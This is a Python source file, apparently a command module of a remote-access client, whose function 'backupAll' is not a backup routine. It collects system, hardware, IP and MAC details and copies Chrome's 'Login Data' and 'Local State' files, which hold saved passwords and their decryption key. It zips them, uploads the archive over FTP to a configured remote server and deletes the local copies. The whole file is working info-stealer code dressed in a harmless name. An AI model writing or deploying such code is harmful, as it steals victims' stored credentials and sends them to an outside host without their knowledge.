def backupAll():
    try:
        import zipfile
        from shutil import copyfile
        import getpass
        from datetime import datetime
        import uuid
        import ftplib
        import os
        import functions.get_config as get_config
        import functions.commands.client_hardware_info as client_hardware_info
        import functions.commands.get_sys_info as get_sys_info
        import functions.commands.get_client_ip as get_client_ip
        import functions.commands.get_client_mac as get_client_mac
    except:
        return "Cannot import all required modules."
    try:
        data_dir = 'data/'
        client_hardware_info.getHardwareInfo()
        f = open(data_dir + "system_info.txt", "a")
        f.write(get_sys_info.getSystemInfo())
        f.write("\n")
        f.write("Client IP: " + get_client_ip.getClientIp())
        f.write("\n")
        client_mac_adrs = get_client_mac.getClientMac()
        f.write(client_mac_adrs)
        f.write("\n")
        f.close()
    except:
        return "Cannot get all System or Hardware infos."
    
    try:
        pc_username = getpass.getuser()
        #Local State
        chrome_local_state_file_path = "C:\\Users\\" + pc_username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
        copyfile(chrome_local_state_file_path, data_dir + "Local State")
        #Login Data
        chrome_login_data_file_path = "C:\\Users\\" + pc_username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
        copyfile(chrome_login_data_file_path, data_dir + "Login Data")
        client_use_chrome = True
    except:
        client_use_chrome = False

    try:
        today = datetime.today()
        now = datetime.now()
        client_mac_adrs = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
        client_mac_adrs = client_mac_adrs.replace(":", ".")
        zipfile_name = data_dir + today.strftime("%Y.%m.%d") + "-" + now.strftime("%Hh%M.%S") + "_" + client_mac_adrs + "_data.zip"
    except:
        return "Cannot get zip file name"

    try:
        zipObj = zipfile.ZipFile(zipfile_name, "w")
        zipObj.write(data_dir +"hardware_info.txt")
        zipObj.write(data_dir + "system_info.txt")
        if client_use_chrome == True: 
            zipObj.write(data_dir + "Login Data", data_dir + "Default/Login Data")
            zipObj.write(data_dir + "Local State")
        zipObj.close()
    except:
        return "Cannot pack ZIP Archive."

    try:
        ftp_session = ftplib.FTP(get_config.getWebConfig("ftp_server_addr"), get_config.getWebConfig("ftp_server_user"), get_config.getWebConfig("ftp_server_passwd"))
        zip_file = open(zipfile_name, 'rb')
        upld_zipfile_name = zipfile_name.replace(data_dir, "")
        ftp_session.storbinary('STOR /client_backups/' + upld_zipfile_name, zip_file)
        zip_file.close()
        ftp_session.quit()
    except:
        return "Cannot get Web config or Upload to FTP Server."
 
    try:
        for f in os.listdir(data_dir):
            os.remove(os.path.join(data_dir, f))
    except:
        pass
    
    return "Backup uploaded at: https://data.clientnet.ml/client_backups/" + upld_zipfile_name